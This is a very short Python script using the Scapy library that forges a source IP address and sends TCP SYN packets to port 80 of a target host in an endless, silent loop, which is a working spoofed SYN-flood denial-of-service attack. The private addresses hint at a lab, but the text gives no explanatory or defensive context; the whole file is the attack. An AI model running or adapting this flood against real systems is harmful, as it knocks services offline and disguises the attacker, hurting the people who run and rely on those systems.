from scapy.all import IP, TCP, send

spoofed_ip = "192.168.11.129" 
target_ip = "192.168.110.128" 

syn_packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=80, flags="S")

send(syn_packet, loop=1, verbose=0)